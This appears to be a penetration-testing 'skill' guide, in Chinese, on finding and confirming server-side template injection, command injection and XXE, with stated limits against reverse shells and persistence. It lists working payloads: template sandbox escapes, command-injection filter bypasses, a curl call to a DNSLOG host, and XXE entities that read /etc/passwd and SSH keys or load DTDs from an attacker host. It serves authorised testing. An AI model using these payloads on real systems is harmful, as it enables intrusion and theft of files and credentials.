---
name: ssti-cmdi-xxe
domain: ssti|command-injection|xxe
modes: [src, redteam, pentest]
exit_artifacts: [reproduction, impact]
---

# SSTI / 命令注入 / XXE（三类注入合一个 skill）

> **定位**：coverage-audit 有最小探针但无深度打法。本 skill 补三类注入的识别→确认→利用思路。给方向不局限方法。

## Domain

- SSTI：用户输入被模板引擎渲染（Jinja2/Twig/Freemarker/Velocity/Thymeleaf/Smarty）
- 命令注入：用户输入被拼入系统命令执行（`system()`/`exec()`/`Runtime.exec()`/`popen()`）
- XXE：用户输入被 XML 解析器处理（`libxml2`/`DOMParser`/`etree` 未禁外部实体）
- modes: src 高危（SSTI/命令注入 = RCE），pentest 必测

## Boundaries

- RCE payload 限 `whoami`/`id`/`echo`，命中即停（law.md §4.1）
- 不反弹 shell / 不持久化 / 不横向
- XXE 文件读只截图证明，不批量读
- 命令注入 OOB 回连须 DNSLOG，命中即停

---

## 三类注入分析思路

### SSTI（模板注入）

**识别思路**：输入 `{{7*7}}` `${7*7}` `<%=7*7%>` `#{7*7}` 看返回 49

**引擎识别思路**（不同引擎 payload 不同）：
- Jinja2（Python/Flask）：`{{7*7}}` → 49，`{{config}}` 看配置
- Twig（PHP/Symfony）：`{{7*7}}` → 49，`{{_self.env.register("exec").getOutput()}}`
- Freemarker（Java/Spring）：`${7*7}` → 49，`<#assign cmd="exec...">`
- Velocity（Java）：`#set($x=7*7)$x` → 49
- Thymeleaf（Java/Spring）：`__${7*7}__` → 49
- Smarty（PHP）：`{7*7}` → 49

**沙箱逃逸思路**：引擎可能有沙箱限制——思考限制的是什么？类加载？文件读写？命令执行？
- Python：`{{().__class__.__bases__[0].__subclasses__()}}` 找可利用类
- Java：`${class.forName("java.lang.Runtime").getMethod("exec","").invoke("")}`
- PHP：`{{_self.env.register("exec").getOutput()}}` / `{{['id']|filter('system')}}`

**Pivot**：
- `{{7*7}}` 无回显 → 试不同引擎语法 / 试盲 SSTI（时间差）
- 沙箱拦了 → 看报错信息确认引擎版本 → 查该版本已知逃逸 payload
- 输入被过滤 → 编码/拆分/注释绕过（`{{7*''7}}` / `{{7*""~7}}`）

### 命令注入

**识别思路**：参数后加 `;id` `|id` `` `id` `` `$(id)` `%0aid` 看回显

**注入点思路**：
- 搜索/查询参数 → `q=test;id`
- 文件名参数 → `file=test.txt;id`
- HTTP Header → `X-Forwarded-For: 127.0.0.1;id` / `User-Agent: test;id` / `Referer: ;id`
- API 参数 → `callback=test;id` / `format=json;id`
- 后端拼接命令 → ping/traceroute/convert/parse 类功能

**盲注思路**（无回显）：
- 时间差：`;sleep 5` → 响应延迟 5 秒 = 命令执行
- OOB 回连：`;curl http://DNSLOG/a` → DNSLOG 收到 = 命令执行
- 文件写：`;echo test > /tmp/pwned` → 后续读取验证

**Pivot**：
- `;` 被过滤 → 试 `|` / `||` / `&&` / `&` / `\\n` / `%0a` / `%0d`
- `id` 被过滤 → 试 `whoami` / `cat /etc/passwd` / `echo $USER`
- 空格被过滤 → `${IFS}` / `$IFS` / `<` / `{}`
- 命令被过滤 → 变量拼接（`a=who;b=ami;$a$b`）/ 通配符（`/bin/ca? /etc/pass?`）

### XXE

**识别思路**：输入 XML 含 `<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` 看文件内容回显

**利用场景思路**：
- 文件读：`file:///etc/passwd` / `file:///proc/self/environ` / `file:///root/.ssh/id_rsa`
- SSRF：`http://127.0.0.1/` / `http://169.254.169.254/latest/meta-data/`
- 盲 XXE：无回显 → OOB 外带（`<!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">%xxe;`）
- 参数实体：`<!DOCTYPE x [<!ENTITY % d SYSTEM "http://attacker/d.dtd">%d;]>`
- 内网探测：`http://192.168.1.1/` / `http://10.0.0.1/`

**注入点思路**：
- XML API：Content-Type: application/xml → body 是 XML
- SOAP：`<soap:Body>` → 注入实体
- SVG 上传：`<svg><image href="xxe://...">` → XXE in SVG
- DOCX/XLSX 上传：`[Content_Types].xml` → 注入实体
- RSS/Atom：`<feed>` / `<rss>` → 注入实体

**Pivot**：
- XML 解析器禁了外部实体 → 试参数实体 / 试 XInclude
- 无回显 → 盲 XXE + OOB（需自己搭 DTD server）
- Content-Type 不接受 XML → 试 `application/xml` / `text/xml` / `application/soap+xml`
- SVG 上传被拦 → 试 DOCX/XLSX 里的 XML

---

## Common misses

- **SSTI 只试 `{{7*7}}`** → 不同引擎语法不同，Jinja2 和 Thymeleaf 的 payload 完全不同
- **命令注入只试 `;`** → `|` / `&&` / `%0a` / `${IFS}` 都要试
- **XXE 只试 file://** → SSRF + 盲 XXE + 参数实体也要试
- **盲注入不搭 OOB** → 无回显不等于无注入，时间差/DNSLOG 能证明
- **SVG/DOCX 里不试 XXE** → 文件格式解析器可能也解析 XML 外部实体
- **Header 不试命令注入** → X-Forwarded-For/UA/Referer 常被日志记录后执行
- **命令注入命中后深挖** → whoami 命中即停，不进一步利用（law.md §4.1）

## Verification

- **SSTI verified**：模板语法执行 + 回显 49 或 config/类信息 + PoC 重放
- **命令注入 verified**：命令执行 + 回显 whoami/id 输出 或 DNSLOG 收到 / 时间差可复现
- **XXE verified**：实体解析 + 文件内容回显 或 OOB DNSLOG 收到
- **phenomenon**：模板语法不执行 / 命令被过滤 / XML 解析器禁了外部实体

## ⚠️ 红线

- RCE/命令注入/反序列化 = 重武器，命中即停，1 次 `whoami` 证明即可
- 不反弹 shell / 不持久化 / 不横向
- XXE 文件读只截图证明，不批量读
- OOB 回连须 DNSLOG，命中即停

## Related

- `deserialization-rce.md` — Java 反序列化（可能有命令执行链）
- `ssrf-arbitrary-file.md` — SSRF + 任意文件读（XXE 也是 SSRF 的一种）
- `doctrine/coverage-audit.md` #6 SSTI / #7 命令注入 / #9 XXE
- `doctrine/reflexes.md` 组合指纹触发器（Java+用户输入 → Log4j 也含命令执行）
